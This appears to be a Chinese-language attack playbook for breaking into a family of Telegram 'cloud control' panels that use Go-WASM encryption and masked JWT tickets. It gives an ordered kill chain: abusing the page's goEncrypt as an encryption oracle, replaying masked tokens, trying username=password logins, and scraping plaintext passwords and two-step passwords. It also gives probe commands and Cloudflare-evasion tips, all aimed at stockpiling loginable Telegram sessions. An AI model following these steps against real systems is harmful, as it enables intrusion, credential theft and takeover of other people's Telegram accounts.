# TG 云控 Go-WASM 掩码票手法（第四族）

> 认族：`tg-cloud-panel` **第四族**。不要打 Fernet / OSS STS / `your_secret_key`。  
> 探针：`tg_cloud_panel_probe.py`（`go-wasm` / `masked-jwt`）+ `jwt_gql_probe.py --token '<掩码票>'`  
> 成功口径：可登录 TG session（Telethon `.session` / MTProto `authKey`），不是手机号列表。

三族仍走原杀伤链。本族指纹：Vue3 SPA + `/main.wasm` + `window.goEncrypt` / `goDecrypt` + 登录返回 `eyJhbG...XXXX` 掩码票。

## 强制顺序

```text
scope
 → 认族（有 main.wasm / goEncrypt → 本族；gAAAAA → Fernet；系统选择 → 扩展包；your_secret_key → 第三族）
 → 有头浏览器加载登录页，确认 typeof goEncrypt === "function"
 → 加密管道：payload + {_ts,_nonce} → goEncrypt → POST text/plain + Header token
 → 掩码票原样调 /api/auth/check（不验签，当 session 查找键）
 → 弱口 username=password + captcha 可空 → 商户票
 → pageList 扫明文 password / importPageList 的 base64Data / getDetail 的 twoPasswd
 → 客服票只打 chat 工作台，不要拿去打 manager 管理面
 → 协议恢复 taskProtocolRecovery 要可用代理 IP；创建任务前先问
 → session 验活入库 tg-account-library
```

## 命令

```bash
python3 炼蛊房/tg_cloud_panel_probe.py -u https://授权云控 --case <案卷>
python3 炼蛊房/jwt_gql_probe.py -u https://授权云控 --case <案卷> --token 'eyJhbG...XXXX'
```

加密 oracle 用本机有头 Chrome（`chrome-automation` / 页面 context），不要先 IDA/Ghidra 拆 WASM。  
批量拉号遇 Cloudflare 1010：停 3–5 分钟；WASM `RangeError` 就 reload 页面重建实例。

## 对象矩阵（有身份立刻填）

| | 读账号/session | 读客服密 | 协议恢复 | 改超管 |
|--|----------------|----------|----------|--------|
| 自己租户 | 默认打 | pageList 明文即 L2 | 先问 | 禁止默认 |
| 其他租户 | IDOR 常被服务端归属拦住 | 403 | 端口过期勿当洞 | 禁止 |

## 不要做

- 把掩码票当「坏 JWT」丢掉去只撞 HS256
- 先逆向 WASM 再调接口
- 用客服密打 manager 管理 API 失败就结案
- 无可用代理就狂建 protocolRecovery 任务
- 报告里的第三方租户名写进默认字典
